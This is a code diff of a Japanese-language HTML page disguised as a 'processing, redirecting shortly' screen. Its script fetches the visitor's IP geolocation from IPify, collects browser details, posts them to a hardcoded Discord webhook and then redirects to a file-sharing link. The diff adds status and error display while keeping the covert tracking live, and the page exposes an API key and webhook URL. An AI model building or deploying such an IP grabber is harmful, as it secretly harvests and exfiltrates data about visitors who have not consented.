@@ -21,42 +21,53 @@
             border-radius: 8px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
+        .error {
+            color: #e74c3c;
+            margin-top: 15px;
+        }
+        .success {
+            color: #2ecc71;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>情報を処理中です...</h2>
-        <p>まもなくリダイレクトします</p>
+        <h2 id="status-title">情報を処理中です...</h2>
+        <p id="status-message">まもなくリダイレクトします</p>
+        <div id="error-message" class="error" style="display: none;"></div>
     </div>
 
     <script>
         // --- 設定項目：ここにあなたの情報を入れてください ---
-        const IPIFY_API_KEY = "at_J8ZKGW0bpTAwgzuAWbPD7jh6qQtnH&ipAddress=8.8.8.8"; // IPifyのAPIキー
+        const IPIFY_API_KEY = "at_J8ZKGW0bpTAwgzuAWbPD7jh6qQtnH"; // IPifyのAPIキー
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532580581722951771/iZJ3O-Qkt9gjk8oo0p_ViEcnkveUPgzs1mb_zBn7P0xFQVqHuMWBc9kVz7qN_Ij7RysX"; // DiscordのWebhook URL
         const REDIRECT_URL = "https://6.gigafile.nu/1031-b55d28e71d81aa40947038e771f224888"; // リダイレクト先のURL
         // ----------------------------------------------
 
         // IPアドレスとその他情報を取得してDiscordに送信するメイン関数
         async function getIpInfoAndSend() {
-            console.log("処理を開始します...");
+            const statusTitle = document.getElementById('status-title');
+            const statusMessage = document.getElementById('status-message');
+            const errorMessage = document.getElementById('error-message');
 
             // APIキーとWebhook URLが設定されているかチェック
             if (IPIFY_API_KEY === "YOUR_API_KEY" || DISCORD_WEBHOOK_URL.includes("YOUR_WEBHOOK_ID")) {
-                console.error("APIキーまたはWebhook URLが設定されていません。コード内の設定項目を確認してください。");
-                // エラー時でもリダイレクト
-                setTimeout(() => window.location.href = REDIRECT_URL, 1000);
+                showError("APIキーまたはWebhook URLが設定されていません。");
                 return;
             }
 
             try {
                 // 1. IPify APIを使用してIP情報を取得
-                console.log("IPifyにリクエストを送信中...");
+                statusMessage.textContent = "IP情報を取得中...";
                 const ipResponse = await fetch(`https://geo.ipify.org/api/v1?apiKey=${IPIFY_API_KEY}`);
+                
                 if (!ipResponse.ok) {
                     throw new Error(`IPify APIへのリクエストが失敗しました: ${ipResponse.status} ${ipResponse.statusText}`);
                 }
+                
                 const ipData = await ipResponse.json();
-                console.log("IP情報の取得に成功:", ipData);
+                statusMessage.textContent = "ブラウザ情報を収集中...";
 
                 // 2. ブラウザ情報を取得
                 const browserInfo = {
@@ -66,7 +77,6 @@
                     screenResolution: `${screen.width}x${screen.height}`,
                     timestamp: new Date().toISOString()
                 };
-                console.log("ブラウザ情報:", browserInfo);
 
                 // 3. Discordに送信するデータを作成
                 const discordPayload = {
@@ -89,7 +99,7 @@
                 };
 
                 // 4. Discord Webhookにデータを送信
-                console.log("Discordにデータを送信中...");
+                statusMessage.textContent = "情報を送信中...";
                 const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
@@ -99,23 +109,37 @@
                 });
 
                 if (!discordResponse.ok) {
-                    // Discordからのエラーレスポンスを詳細に表示
                     const errorText = await discordResponse.text();
-                    throw new Error(`Discord Webhookへの送信が失敗しました: ${discordResponse.status} ${discordResponse.statusText} - ${errorText}`);
+                    throw new Error(`Discord Webhookへの送信が失敗しました: ${discordResponse.status} ${discordResponse.statusText}`);
                 }
-                console.log("Discordへの送信に成功しました。");
 
                 // 5. 送信後、指定したURLにリダイレクト
+                statusTitle.textContent = "情報の送信が完了しました";
+                statusMessage.textContent = "まもなくリダイレクトします";
+                
                 setTimeout(() => {
-                    console.log(`${REDIRECT_URL} にリダイレクトします。`);
                     window.location.href = REDIRECT_URL;
-                }, 1000);
+                }, 2000);
 
             } catch (error) {
-                console.error("処理中にエラーが発生しました:", error);
+                showError(`エラーが発生しました: ${error.message}`);
+                
                 // エラー時もリダイレクト
-                setTimeout(() => window.location.href = REDIRECT_URL, 1000);
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 3000);
             }
+        }
+
+        function showError(message) {
+            const statusTitle = document.getElementById('status-title');
+            const statusMessage = document.getElementById('status-message');
+            const errorMessage = document.getElementById('error-message');
+            
+            statusTitle.textContent = "エラーが発生しました";
+            statusMessage.textContent = "しばらくしてからもう一度お試しください";
+            errorMessage.textContent = message;
+            errorMessage.style.display = "block";
         }
 
         // ページ読み込み時に実行
